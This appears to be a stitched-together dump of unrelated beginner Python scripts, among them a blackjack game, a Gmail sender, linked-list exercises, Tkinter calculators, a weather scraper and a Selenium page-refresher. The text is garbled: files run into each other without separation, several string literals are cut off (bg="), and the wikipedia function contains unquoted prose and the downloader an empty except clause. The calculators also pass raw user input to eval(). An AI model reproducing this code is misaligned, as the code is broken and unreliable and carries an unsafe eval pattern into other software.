            return Matrix(matrix, self.__width, self.__height)
        else:
            raise Exception("matrix must have the same dimension!")
    def __eq__(self, other):
        ans = True
        if self.__width == other.width() and self.__height == other.height():
            for i in range(self.__height):
                for j in range(self.__width):
                    if self.__matrix[i][j] != other.component(i, j):
                        ans = False
                        break
        else:
            ans = False
        return ans
def squareZeroMatrix(N):
    ans = []
    for i in range(N):
        row = []
        for j in range(N):
            row.append(0)
        ans.append(row)
    return Matrix(ans, N, N)
def randomMatrix(W, H, a, b):
    matrix = []
    random.seed(None)
    for i in range(H):
        row = []
        for j in range(W):
            row.append(random.randint(a, b))
        matrix.append(row)
    return Matrix(matrix, W, H)
import cv2 as cv
img = cv.imread("..\img\hand1.jpg", 0)
flag, frame = cv.threshold(img, 70, 255, cv.THRESH_BINARY)
contor, _ = cv.findContours(frame.copy(), cv.RETR_TREE, cv.CHAIN_APPROX_SIMPLE)
hull = [cv.convexHull(c) for c in contor]
final = cv.drawContours(img, hull, -1, (0, 0, 0))
cv.imshow("original_image", img)
cv.imshow("thres", frame)
cv.imshow("final_hsv", final)
cv.waitKey(0)
cv.destroyAllWindows()
num = 7
factorial = 1
if num < 0:
   print("Sorry, factorial does not exist for negative numbers")
elif num == 0:
   print("The factorial of 0 is 1")
else:
   for i in range(1,num + 1):
       factorial = factorial*i
   print("The factorial of",num,"is",factorial)
from appJar import gui
def press():
    p.warningBox('Uyarı', 'Uyarı!', parent=None)
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()
def missing_number(num_list):
    return sum(range(num_list[0],num_list[-1]+1)) - sum(num_list)
print(missing_number([1,2,3,4,6,7,8]))  
print(missing_number([10,11,12,14,15,16,17]))
from __future__ import print_function
import random
import simplegui
CARD_SIZE = (72, 96)
CARD_CENTER = (36, 48)
card_images = simplegui.load_image("http://storage.googleapis.com/codeskulptor-assets/cards_jfitz.png")
in_play = False
outcome = ""
score = 0
SUITS = ('C', 'S', 'H', 'D')
RANKS = ('A', '2', '3', '4', '5', '6', '7', '8', '9', 'T', 'J', 'Q', 'K')
VALUES = {'A': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'T': 10, 'J': 10, 'Q': 10, 'K': 10}
class Card:
    def __init__(self, suit, rank):
        if (suit in SUITS) and (rank in RANKS):
            self.suit = suit
            self.rank = rank
        else:
            self.suit = None
            self.rank = None
            print(("Invalid card: ", suit, rank))
    def __str__(self):
        return self.suit + self.rank
    def get_suit(self):
        return self.suit
    def get_rank(self):
        return self.rank
    def draw(self, canvas, pos):
        card_loc = (CARD_CENTER[0] + CARD_SIZE[0] * RANKS.index(self.rank),
                    CARD_CENTER[1] + CARD_SIZE[1] * SUITS.index(self.suit))
        canvas.draw_image(card_images, card_loc, CARD_SIZE, [pos[0] + CARD_CENTER[0], pos[1] + CARD_CENTER[1]],
                          CARD_SIZE)
def string_list_join(string, string_list):
    ans = string + " contains "
    for i in range(len(string_list)):
        ans += str(string_list[i]) + " "
    return ans
class Hand:
    def __init__(self):
        self.hand = []
    def __str__(self):
        return string_list_join("Hand", self.hand)
    def add_card(self, card):
        self.hand.append(card)
    def get_value(self):
        var = []
        self.hand_value = 0
        for card in self.hand:
            card = str(card)
            if card[1] in VALUES:
                self.hand_value += VALUES[card[1]]
                var.append(card[1])
        if 'A' not in var:
            return self.hand_value
        if self.hand_value + 10 <= 21:
            return self.hand_value + 10
        else:
            return self.hand_value
    def draw(self, canvas, pos):
        for card in self.hand:
            card = str(card)
            Card(card[0], card[1]).draw(canvas, pos)
            pos[0] += 36
class Deck:
    def __init__(self):
        self.Deck = [Card(suit, rank) for suit in SUITS for rank in RANKS]
    def shuffle(self):
        random.shuffle(self.Deck)
    def deal_card(self):
        return random.choice(self.Deck)
    def __str__(self):
        return string_list_join("Deck", self.Deck)
def deal():
    global outcome, in_play, score1, score2, player_card, dealer_card, deck
    outcome = ""
    player_card = Hand()
    dealer_card = Hand()
    deck = Deck()
    for i in range(2):
        player_card.add_card(deck.deal_card())
        dealer_card.add_card(deck.deal_card())
    in_play = True
    score1 = str(player_card.get_value())
    score2 = str(dealer_card.get_value())
def stand():
    if in_play == True:
        while dealer_card.get_value() < 17:
            dealer_card.add_card(deck.deal_card())
    if dealer_card.get_value() > 21:
        outcome = "you won!!"
    elif player_card.get_value() <= dealer_card.get_value():
        outcome = "you lose"
    else:
        outcome = "you won!!"
    score1 = str(player_card.get_value())
    score2 = str(dealer_card.get_value())
def hit():
    global outcome, in_play, score1, score2, player_card, dealer_card, deck
    if in_play == True:
        player_card.add_card(deck.deal_card())
    if player_card.get_value() > 21:
        outcome = "you are busted"
        in_play = False
    score1 = str(player_card.get_value())
    score2 = str(dealer_card.get_value())
def draw(canvas):
    canvas.draw_text(outcome, [250, 150], 25, 'White')
    canvas.draw_text("BlackJack", [250, 50], 40, 'Black')
    canvas.draw_text(score1, [100, 100], 40, 'Red')
    player_card.draw(canvas, [20, 300])
    dealer_card.draw(canvas, [300, 300])
    canvas.draw_text(score2, [400, 100], 40, 'Red')
frame = simplegui.create_frame("Blackjack", 600, 600)
frame.set_canvas_background("Green")
frame.add_button("Deal", deal, 200)
frame.add_button("Hit", hit, 200)
frame.add_button("Stand", stand, 200)
frame.set_draw_handler(draw)
deal()
frame.start()
from __future__ import print_function
import base64
import mimetypes
import os
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import httplib2
import oauth2client
from apiclient import errors, discovery
from oauth2client import client, tools
SCOPES = 'https://www.googleapis.com/auth/gmail.send'
CLIENT_SECRET_FILE = 'client_secret.json'
APPLICATION_NAME = 'Gmail API Python Send Email'
def get_credentials():
    home_dir = os.path.expanduser('~')
    credential_dir = os.path.join(home_dir, '.credentials')
    if not os.path.exists(credential_dir):
        os.makedirs(credential_dir)
    credential_path = os.path.join(credential_dir,
                                   'gmail-python-email-send.json')
    store = oauth2client.file.Storage(credential_path)
    credentials = store.get()
    if not credentials or credentials.invalid:
        flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES)
        flow.user_agent = APPLICATION_NAME
        credentials = tools.run_flow(flow, store)
        print('Storing credentials to ' + credential_path)
    return credentials
def SendMessage(sender, to, subject, msgHtml, msgPlain, attachmentFile=None):
    credentials = get_credentials()
    http = credentials.authorize(httplib2.Http())
    service = discovery.build('gmail', 'v1', http=http)
    if attachmentFile:
        message1 = createMessageWithAttachment(sender, to, subject, msgHtml, msgPlain, attachmentFile)
    else:
        message1 = CreateMessageHtml(sender, to, subject, msgHtml, msgPlain)
    result = SendMessageInternal(service, "me", message1)
    return result
def SendMessageInternal(service, user_id, message):
    try:
        message = (service.users().messages().send(userId=user_id, body=message).execute())
        print('Message Id: %s' % message['id'])
        return message
    except errors.HttpError as error:
        print('An error occurred: %s' % error)
        return "Error"
    return "OK"
def createMessageWithAttachment(
    sender, to, subject, msgHtml, msgPlain, attachmentFile):
    message = MIMEMultipart('mixed')
    message['to'] = to
    message['from'] = sender
    message['subject'] = subject
    messageA = MIMEMultipart('alternative')
    messageR = MIMEMultipart('related')
    messageR.attach(MIMEText(msgHtml, 'html'))
    messageA.attach(MIMEText(msgPlain, 'plain'))
    messageA.attach(messageR)
    message.attach(messageA)
    print("create_message_with_attachment: file:", attachmentFile)
    content_type, encoding = mimetypes.guess_type(attachmentFile)
    if content_type is None or encoding is not None:
        content_type = 'application/octet-stream'
    main_type, sub_type = content_type.split('/', 1)
    if main_type == 'text':
        fp = open(attachmentFile, 'rb')
        msg = MIMEText(fp.read(), _subtype=sub_type)
        fp.close()
    elif main_type == 'image':
        fp = open(attachmentFile, 'rb')
        msg = MIMEImage(fp.read(), _subtype=sub_type)
        fp.close()
    elif main_type == 'audio':
        fp = open(attachmentFile, 'rb')
        msg = MIMEAudio(fp.read(), _subtype=sub_type)
        fp.close()
    else:
        fp = open(attachmentFile, 'rb')
        msg = MIMEBase(main_type, sub_type)
        msg.set_payload(fp.read())
        fp.close()
    filename = os.path.basename(attachmentFile)
    msg.add_header('Content-Disposition', 'attachment', filename=filename)
    message.attach(msg)
    return {'raw': base64.urlsafe_b64encode(message.as_string())}
def CreateMessageHtml(sender, to, subject, msgHtml, msgPlain):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = to
    msg.attach(MIMEText(msgPlain, 'plain'))
    msg.attach(MIMEText(msgHtml, 'html'))
    return {'raw': base64.urlsafe_b64encode(msg.as_string())}
def main():
    to = input("Enter Email Address: ")
    sender = input("Your Mail ID: ")
    subject = input("Enter your Subject: ")
    msgHtml = input("Enter your Message: ")
    msgPlain = "Hi\nPlain Email"
    SendMessage(sender, to, subject, msgHtml, msgPlain)
if __name__ == '__main__':
    main()
import simplegui
polyline = []
def click(pos):
    global polyline
    polyline.append(pos)
def clear():
    global polyline
    polyline = []
def draw(canvas):
    if len(polyline) == 1:
        canvas.draw_point(polyline[0], "White")
    for i in range(1, len(polyline)):
        canvas.draw_line(polyline[i - 1], polyline[i], 2, "White")
frame = simplegui.create_frame("Echo click", 300, 200)
frame.set_mouseclick_handler(click)
frame.set_draw_handler(draw)
frame.add_button("Clear", clear)
frame.start()
class Human:
    def __init__(self, n, o):
        self.name = n
        self.occupation = o
    def do_work(self):
        if self.occupation == "tennis player":
            print(self.name, "plays tennis")
        elif self.occupation == "actor":
            print(self.name, "shoots film")
    def speaks(self):
        print(self.name, "says how are you?")
tom = Human("tom cruise","actor")
tom.do_work()
tom.speaks()
maria = Human("maria sharapova","tennis player")
maria.do_work()
maria.speaks()class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Circular_Linked_List:
    def __init__(self):
        self.head = None
    def Push(self, data):
        temp = Node(data)
        temp.next = self.head
        temp1 = self.head
        if self.head is not None:
            while temp1.next is not None:
                temp1 = temp1.next
            temp1.next = temp
        else:
            temp.next = temp
        self.head = temp
    def Split_List(self, head1, head2):
        if self.head is None:
            return
        slow_ptr = self.head
        fast_ptr = self.head
        while fast_ptr.next != self.head and fast_ptr.next.next != self.head:
            fast_ptr = fast_ptr.next.next
            slow_ptr = slow_ptr.next.next
        if fast_ptr.next.next == self.head:
            fast_ptr = fast_ptr.next
        head1 = self.head
        slow_ptr.next = head1
        if self.head.next != self.head:
            head2.head = slow_ptr.next
        fast_ptr.next = slow_ptr.next
    def Display(self):
        temp = self.head
        if self.head is not None:
            while(temp):
                print(temp.data, "->", end=" ")
                temp = temp.next
                if temp == self.head:
                    print(temp.data)
                    break
if __name__ == "__main__":
    L_list = Circular_Linked_List()
    head1 = Circular_Linked_List()
    head2 = Circular_Linked_List()
    L_list.Push(6)
    L_list.Push(4)
    L_list.Push(2)
    L_list.Push(8)
    L_list.Push(12)
    L_list.Push(10)
    L_list.Split_List(head1, head2)
    print("Circular Linked List: ")
    L_list.Display()
    print("Firts Split Linked List: ")
    head1.Display()
    print("Second Split Linked List: ")
    head2.Display()
import pyqrcode
import png
from pyqrcode import QRCode
print("Enter text to convert")
s=input(": ")
print("Enter image name to save")
n=input(": ")
d=n+".png"
url=pyqrcode.create(s)
url.show()
url.png(d, scale =6)
from pytube import *
import sys
class YouTubeDownloder:
    def __init__(self):
        self.url = str(input("Enter the url of video : "))
        self.youtube = YouTube(
            self.url, on_progress_callback=YouTubeDownloder.onProgress)
        self.showTitle()
    def showTitle(self):
        print("title : {0}\n".format(self.youtube.title))
        self.showStreams()
    def showStreams(self):
        self.streamNo = 1
        for stream in self.youtube.streams:
            print("{0} => resolation:{1}/fps:{2}/type:{3}".format(self.streamNo,
                                                                  stream.resolution, stream.fps, stream.type))
            self.streamNo += 1
        self.chooseStream()
    def chooseStream(self):
        self.choose = int(input("please select one : "))
        self.validateChooseValue()
    def validateChooseValue(self):
        if self.choose in range(1, self.streamNo):
            self.getStream()
        else:
            print("please enter a currect option on the list.")
            self.chooseStream()
    def getStream(self):
        self.stream = self.youtube.streams[self.choose-1]
        self.getFileSize()
    def getFileSize(self):
        global file_size
        file_size = self.stream.filesize / 1000000
        self.getPermisionToContinue()
    def getPermisionToContinue(self):
        print("\n title : {0} \n author : {1} \n size : {2:.2f}MB \n resolution : {3} \n fps : {4} \n ".format(
            self.youtube.title, self.youtube.author, file_size, self.stream.resolution, self.stream.fps))
        if input("do you want it ?(defualt = (y)es) or (n)o ") == "n":
            self.showStreams()
        else:
            self.main()
    def download(self):
        self.stream.download()
    def onProgress(stream=None, chunk=None,  remaining=None):
        file_downloaded = (file_size-(remaining/1000000))
        print(
            f"downloading ... {file_downloaded/file_size*100:0.2f} % [{file_downloaded:.1f}MB of {file_size:.1f}MB]", end="\r")
    def main(self):
        try:
            self.download()
        except KeyboardInterrupt:
            print("Canceled. ")
            sys.exit(0)
if __name__ == "__main__":
    try:
        YouTubeDownloder()
    except KeyboardInterrupt:
        pass
    except Exception as e:
import requests
import webbrowser
page_count = 10
url = 'https://en.wikipedia.org/w/api.php?action=query&list=random&rnnamespace=0&rnlimit=' + str(
    page_count) + '&format=json'
def load():
    response = requests.get(url)
    if response.ok:
        jsonData = response.json()['query']['random']
        print("10 Random generted WIKI pages...")
        for idx, j in enumerate(jsonData):
            print(str(idx) + ": ", j['title'])
        i = input("Which page you want to see, enter index..[r: for retry,n: exit]?").lower()
        if i == 'r':
            print('Loading randoms again...')
        elif i == 'n':
            print('Auf Wiedersehen!')
            return
        else:
            try:
                jsonData[int(i)]['id']
            except Exception:
                raise Exception("Wrong Input...")
            print('taking you to the browser...')
            webbrowser.get().open('https://en.wikipedia.org/wiki?curid=' + str(jsonData[int(i)]['id']))
        load()
    else:
        response.raise_for_status()
if __name__ == '__main__':
    load()
expense_list = [1230, 2240, 1500, 1678, 2020, 1580, 2240, 1500, 1245, 2300, 1246, 3400, 1580, 2240, 1500, 3240, 2240, 1500, 1245, 2300, 1246, 3400, 1580, 2240, 2467, 1245, 2300, 1246, 3400, 1580, 2240, 1500, 3240, 2240, 1500, 1245, 2300, 1246, 3400, 1580, 2240]
total_expense = 0
for expense in expense_list:
    total_expense += expense
print("total expense is: ", total_expense)
from __future__ import print_function
x = input("Enter a number: ")
for i in range(1, 11, 1):
    print(x, "x", i, "=", (x * i))
import os
import platform  
import subprocess
import sys
from time import strftime  
def clear_screen():  
    if os.name == "posix":  
        os.system('clear')  
    elif os.name in ("nt", "dos", "ce"):  
        os.system('CLS')  
def print_docs():  
    print("Printing Daily Check Sheets:")
    subprocess.Popen(["C:\\Program Files (x86)\Microsoft Office\Office14\winword.exe",
                      "P:\\\\Documentation\\Daily Docs\\Back office Daily Checks.doc",
                      "/mFilePrintDefault", "/mFileExit"]).communicate()
def putty_sessions(conffilename):  
    for server in open(conffilename):
        subprocess.Popen(('putty -load ' + server))  
def rdp_sessions():
    print("Loading RDP Sessions:")
    subprocess.Popen("mstsc eclr.rdp")  
def euroclear_docs():
    subprocess.Popen(
        '"C:\\Program Files\\Internet Explorer\\iexplore.exe"' '"file://fs1\pub_b\Pub_Admin\Documentation\Settlements_Files\PWD\Eclr.doc"')
def main():
    filename = sys.argv[0]  
    confdir = os.getenv("my_config")  
    conffile = 'daily_checks_servers.conf'  
    conffilename = os.path.join(confdir, conffile)
    clear_screen()  
    print("Good Morning " + os.getenv('USERNAME') + ", " +
          filename, "ran at", strftime("%Y-%m-%d %H:%M:%S"), "on", platform.node(), "run from", os.getcwd())
    print_docs()  
    putty_sessions(conffilename)  
    rdp_sessions()  
    euroclear_docs()  
if __name__ == "__main__":
    main()
from appJar import gui
def press():
    print(p.getOptionBox('Seçenekler'))
p = gui()
p.setSize(300,200)
p.addOptionBox('Seçenekler', ['- Meyveler -', 'Elma', 'Portakal',
'Armut', '- Hayvanlar -', 'Köpek', 'Kedi', 'Tavşan'])
p.addButton('Buton', press)
import sys
from fileinfo import raw_input
def calc(term):
    term = term.replace(' ', '')
    term = term.replace('^', '**')
    term = term.replace('=', '')
    term = term.replace('?', '')
    term = term.replace('%', '/100.00')
    term = term.replace('rad', 'radians')
    term = term.replace('mod', '%')
    term = term.replace('aval', 'abs')
    functions = ['sin', 'cos', 'tan', 'pow', 'cosh', 'sinh', 'tanh', 'sqrt', 'pi', 'radians', 'e']
    term = term.lower()
    for func in functions:
        if func in term:
            withmath = 'math.' + func
            term = term.replace(func, withmath)
    try:
        term = eval(term)
    except ZeroDivisionError:
        print("Can't divide by 0.  Please try again.")
    except NameError:
        print('Invalid input.  Please try again')
    except AttributeError:
        print('Please check usage method and try again.')
    except TypeError:
        print("please enter inputs of correct datatype ")
    return term
def result(term):
    print("\n" + str(calc(term)))
def main():
    print("\nScientific Calculator\n\nFor Example: sin(rad(90)) + 50% * (sqrt(16)) + round(1.42^2)" +
          "- 12mod3\n\nEnter quit to exit")
    if sys.version_info.major >= 3:
        while True:
            k = input("\nWhat is ")
            if k == 'quit':
                break
            result(k)
    else:
        while True:
            k = raw_input("\nWhat is ")
            if k == 'quit':
                break
            result(k)
if __name__ == '__main__':
    main()
import time
import threading
from threading import Thread
def sleepMe(i):
    print("Thread %i will sleep." % i)
    time.sleep(5)
    print("Thread %i is awake" % i)
for i in range(10):
    th = Thread(target=sleepMe, args=(i, ))
    th.start()
    print("Current Threads: %i." % threading.active_count())
from concurrent.futures import ThreadPoolExecutor
import tornado.ioloop
import tornado.web
from tornado.concurrent import run_on_executor
from tornado.gen import coroutine
try:
    from instagram_monitering.insta_datafetcher import *
    from instagram_monitering.subpinsta import *
except:
    from insta_datafetcher import *
    from subpinsta import *
MAX_WORKERS = 10
class StartHandlerinsta(tornado.web.RequestHandler):
    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    def background_task(self, user, tags, type, productId):
        try:
            instasubprocess(user=user, tags=tags, type=type, productId=productId)
        except:
            print("error::background_task>>", sys.exc_info()[1])
    def get(self):
        try:
            q = self.get_argument("q")
            user = self.get_argument("userId")
            type = self.get_argument("type")
            productId = self.get_argument("productId")
        except:
            self.send_error(400)
        if " " in q:
            q = q.replace(" ", "")
        self.background_task(user=user, tags=q, type=type, productId=productId)
        temp = {}
        temp["query"] = q
        temp["userId"] = user
        temp["status"] = True
        temp["productId"] = productId
        print("{0}, {1}, {2}, {3}".format(temp["userId"], temp["productId"], temp["query"], temp["status"]))
        self.write(ujson.dumps(temp))
class StopHandlerinsta(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument("q")
            user = self.get_argument("userId")
            productId = self.get_argument("productId")
        except:
            self.send_error(400)
        obj = InstaPorcessClass()
        result = obj.deletProcess(tags=q, user=user, productId=productId)
        temp = {}
        temp["query"] = q
        temp["userId"] = user
        temp["productId"] = productId
        temp["status"] = result
        print("{0}, {1}, {2}, {3}".format(temp["userId"], temp["productId"], temp["query"], temp["status"]))
        self.write(ujson.dumps(temp))
class StatusHandlerinsta(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument("q")
            user = self.get_argument("userId")
            productId = self.get_argument("productId")
        except:
            self.send_error(400)
        obj = InstaPorcessClass()
        result = obj.statusCheck(tags=q, user=user, productId=productId)
        temp = {}
        temp["query"] = q
        temp["userId"] = user
        temp["status"] = result
        temp["productId"] = productId
        print("{0}, {1}, {2}, {3}".format(temp["userId"], temp["productId"], temp["query"], temp["status"]))
        self.write(ujson.dumps(temp))
class SenderHandlerinstaLess(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument("q")
            user = self.get_argument("userId")
            type = self.get_argument("type")
            productId = self.get_argument("productId")
            date = self.get_argument("date")
            limit = self.get_argument("limit")
        except:
            self.send_error(400)
        recordsobj = DBDataFetcher(user=user, tags=q, type=type, productId=productId)
        data = recordsobj.DBFetcherLess(limit=limit, date=date)
        self.write(data)
class SenderHandlerinstaGreater(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument("q")
            user = self.get_argument("userId")
            type = self.get_argument("type")
            productId = self.get_argument("productId")
            date = self.get_argument("date")
            limit = self.get_argument("limit")
        except:
            self.send_error(400)
        recordsobj = DBDataFetcher(user=user, tags=q, type=type, productId=productId)
        data = recordsobj.DBFetcherGreater(limit=limit, date=date)
        self.write(data)
if __name__ == '__main__':
    application = tornado.web.Application([(r"/instagram/monitoring/start", StartHandlerinsta),
                                           (r"/instagram/monitoring/stop", StopHandlerinsta),
                                           (r"/instagram/monitoring/status", StatusHandlerinsta),
                                           (r"/instagram/monitoring/less", SenderHandlerinstaLess),
                                           (r"/instagram/monitoring/greater", SenderHandlerinstaGreater), ])
    application.listen(7074)
    print("server running")
    tornado.ioloop.IOLoop.instance().start()
from apscheduler.schedulers.blocking import BlockingScheduler
from caller import search
sched = BlockingScheduler()
sched.add_job(search, 'interval',hours=1) 
sched.start()import math
print('The factors of the number you type when prompted will be displayed')
a = int(input('Type now // '))
b = 1
while b <= math.sqrt(a):
    if a % b == 0:
        print("A factor of the number is ", b)
        print("A factor of the number is ", int(a / b))
    b += 1
from tkinter import *
w=Tk()
w.geometry("500x500")
w.title("Calculatorax")
w.configure(bg="
def calc1():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn1["text"]
    txt1.insert(0, b1)
def calc2():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn2["text"]
    txt1.insert(0, b1)
def calc3():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn3["text"]
    txt1.insert(0, b1)
def calc4():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn4["text"]
    txt1.insert(0, b1)
def calc5():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn5["text"]
    txt1.insert(0, b1)
def calc6():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn6["text"]
    txt1.insert(0, b1)
def calc7():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn7["text"]
    txt1.insert(0, b1)
def calc8():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn8["text"]
    txt1.insert(0, b1)
def calc9():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn9["text"]
    txt1.insert(0, b1)
def calc0():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn0["text"]
    txt1.insert(0, b1)
x = 0
def add():
    global x
    add.b = (eval(txt1.get()))
    txt1.delete(0, END)
    x = x + 1
def subtract():
    global x
    subtract.b = (eval(txt1.get()))
    txt1.delete(0, END)
    x = x + 2
def get():
    b = txt1.get()
def equals():
    global x
    if x == 1:
        c = (eval(txt1.get())) + add.b
        cls()
        txt1.insert(0, c)
    elif x == 2:
        c = subtract.b - (eval(txt1.get()))
        cls()
        txt1.insert(0, c)
    elif x == 3:
        c = multiply.b*(eval(txt1.get()))
        cls()
        txt1.insert(0, c)
    elif x == 4:
        c = divide.b/(eval(txt1.get()))
        cls()
        txt1.insert(0,c)
def cls():
    global x
    x = 0
    txt1.delete(0, END)
def multiply():
    global x
    multiply.b = (eval(txt1.get()))
    txt1.delete(0, END)
    x = x + 3
def divide():
    global x
    divide.b = (eval(txt1.get()))
    txt1.delete(0, END)
    x = x + 4
lbl1 = Label(w, text="Calculatorax", font=("Times New Roman", 35), fg="
txt1 = Entry(w, width=80, font=30)
btn1 = Button(w, text="1", font=("Unispace", 25), command=calc1, bg="
btn2 = Button(w, text="2", font=("Unispace", 25), command=calc2, bg="
btn3 = Button(w, text="3", font=("Unispace", 25), command=calc3, bg="
btn4 = Button(w, text="4", font=("Unispace", 25), command=calc4, bg="
btn5 = Button(w, text="5", font=("Unispace", 25), command=calc5, bg="
btn6 = Button(w, text="6", font=("Unispace", 25), command=calc6, bg="
btn7 = Button(w, text="7", font=("Unispace", 25), command=calc7, bg="
btn8 = Button(w, text="8", font=("Unispace", 25), command=calc8, bg="
btn9 = Button(w, text="9", font=("Unispace", 25), command=calc9, bg="
btn0 = Button(w, text="0", font=("Unispace", 25), command=calc0, bg="
btn_addition = Button(w, text="+", font=("Unispace", 26), command=add, bg="
btn_equals = Button(w, text="Calculate", font=("Unispace", 24,), command=equals, bg="
btn_clear = Button(w, text="Clear", font=("Unispace", 24,), command=cls, bg="
btn_subtract = Button(w, text="-", font=("Unispace", 26), command=subtract, bg="
btn_multiplication = Button(w, text="x", font=("Unispace", 26), command=multiply, bg="
btn_division = Button(w, text="÷", font=("Unispace", 26), command=divide, bg="
lbl1.place(x=120,y=0)
txt1.place(x=7, y=50, height=35)
btn1.place(x=50, y=100)
btn2.place(x=120, y=100)
btn3.place(x=190, y=100)
btn4.place(x=50, y=200)
btn5.place(x=120, y=200)
btn6.place(x=190, y=200)
btn7.place(x=50, y=300)
btn8.place(x=120, y=300)
btn9.place(x=190, y=300)
btn0.place(x=120, y=400)
btn_addition.place(x=290, y=100)
btn_equals.place(x=260, y=420)
btn_clear.place(x=290, y=350)
btn_subtract.place(x=360, y=100)
btn_multiplication.place(x=290, y=200)
btn_division.place(x=360, y=200)
w.mainloop()
def bubbleSort(arr):
	n = len(arr)
	for i in range(n):
		not_swap = True
		for j in range(0, n-i-1):
			if arr[j] > arr[j+1] :
				arr[j], arr[j+1] = arr[j+1], arr[j]
				not_swap = False
		if not_swap:
			break
arr = [64, 34, 25, 12, 22, 11, 90]
bubbleSort(arr)
print ("Sorted array is:")
for i in range(len(arr)):
	print ("%d" %arr[i]),from array import *
array1 = array('i', [10,20,30,40,50])
array1[2] = 80
for x in array1:
 print(x)
import tkinter as tk
import requests
from bs4 import BeautifulSoup
url = 'https://weather.com/en-IN/weather/today/l/32355ced66b7ce3ab7ccafb0a4f45f12e7c915bcf8454f712efa57474ba8d6c8'
root = tk.Tk()
root.title("Weather")
root.config(bg = 'white')
def getWeather():
    page = requests.get(url)
    soup = BeautifulSoup(page.content, 'html.parser')
    location = soup.find('h1',class_="_1Ayv3").text
    temperature = soup.find('span',class_="_3KcTQ").text
    airquality = soup.find('text',class_='k2Z7I').text
    airqualitytitle = soup.find('span',class_='_1VMr2').text
    sunrise = soup.find('div',class_='_2ATeV').text
    sunset = soup.find('div',class_='_2_gJb _2ATeV').text
    wind = soup.find('span',class_='_1Va1P undefined').text
    pressure = soup.find('span',class_='_3olKd undefined').text
    locationlabel.config(text=(location))
    templabel.config(text = temperature+"C")
    WeatherText = "Sunrise : "+sunrise+"\n"+"SunSet : "+sunset+"\n"+"Pressure : "+pressure+"\n"+"Wind : "+wind+"\n"
    weatherPrediction.config(text=WeatherText)
    airqualityText = airquality + " "*5 + airqualitytitle + "\n"
    airqualitylabel.config(text = airqualityText)
    weatherPrediction.after(120000,getWeather)
    root.update()
locationlabel= tk.Label(root, font = ('Calibri bold',20), bg = 'white')
locationlabel.grid(row = 0,column = 1, sticky='N',padx=20,pady=40)
templabel = tk.Label(root, font = ('Caliber bold', 40), bg="white")
templabel.grid(row=0,column = 0,sticky="W",padx=17)
weatherPrediction = tk.Label(root, font = ('Caliber', 15), bg="white")
weatherPrediction.grid(row=2,column=1,sticky="W",padx=40)
tk.Label(root,text = "Air Quality", font = ('Calibri bold',20), bg = 'white').grid(row = 1,column = 2, sticky='W',padx=20)
airqualitylabel = tk.Label(root, font = ('Caliber bold', 20), bg="white")
airqualitylabel.grid(row=2,column=2,sticky="W")
getWeather()
root.mainloop()x=input("Enter number1: ")
y=input("Enter number2: ")
try:
    z = int(x) / int(y)
except ZeroDivisionError as e:
    print('Division by zero exception')
    z = None
except TypeError as e:
    print('Type error exception')
    z = None
import time
import pafy
from selenium import webdriver
count = int(input("Number of times to be repeated: "))
url = input("Enter the URL : ")
refreshrate = None
try:
	video = pafy.new(url)
	if hasattr(video, 'length'):
		refreshrate = video.length
except Exception as e:
	print("Length of video:")
	minutes = int(input("Minutes "))
	seconds = int(input("Seconds "))
	refreshrate = minutes * 60 + seconds
driver = webdriver.Safari()
if url.startswith("https://"):
    driver.get(url)
else:
    driver.get("https://" + url)
for i in range(count):
    time.sleep(refreshrate)
    driver.refresh()
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Linked_List:
    def __init__(self):
        self.head = None
    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while(current.next):
            current = current.next
        current.next = new_node
    def Sort(self):
        temp = self.head
        while(temp):
            minn = temp
            after = temp.next
            while(after):
                if minn.data > after.data:
                    minn = after
                after = after.next
            key = temp.data
            temp.data = minn.data
            minn.data = key
            temp = temp.next
    def Display(self):
        temp = self.head
        while(temp):
            print(temp.data, "->", end=" ")
            temp = temp.next
        print("None")
if __name__ == "__main__":
    L_list = Linked_List()
    L_list.Insert_At_End(8)
    L_list.Insert_At_End(5)
    L_list.Insert_At_End(10)
    L_list.Insert_At_End(7)
    L_list.Insert_At_End(6)
    L_list.Insert_At_End(11)
    L_list.Insert_At_End(9)
    print("Linked List: ")
    L_list.Display()
    print("Sorted Linked List: ")
    L_list.Sort()
    L_list.Display()
from __future__ import print_function
import wikipedia as wk
from bs4 import BeautifulSoup
def wiki():
    word = input("Wikipedia Search : ")
    results = wk.search(word)
    for i in enumerate(results):
        print(i)
    try:
        key = int(input("Enter the number : "))
    except AssertionError:
        key = int(input("Please enter corresponding article number : "))
    page = wk.page(results[key])
    url = page.url
    pageId = page.pageid
    title = page.title
    This function gives you a list of n number of random articles
    Choose any article.
    if pageLength == 1:
        soup = fullPage(page)
        print(soup)
    else:
        print(title)
        print("Page Id = ", pageId)
        print(page.summary)
        print("Page Link = ", url)
    pass
rent=8000
petrol=500.5
groceries=2050.5
print(rent)
total=rent+petrol+groceries
gabbar="amjad khan"
jay="amitabh"
thakur="sanjiv kumar"
print("actors in sholey: ",gabbar,jay,thakur)
print(type(rent))
print(type(groceries))
print(type(gabbar))
learn_python=True
learn_fortran=False
bade_bhai=10
bade_Bhai=5
print(bade_bhai)
print(bade_Bhai)
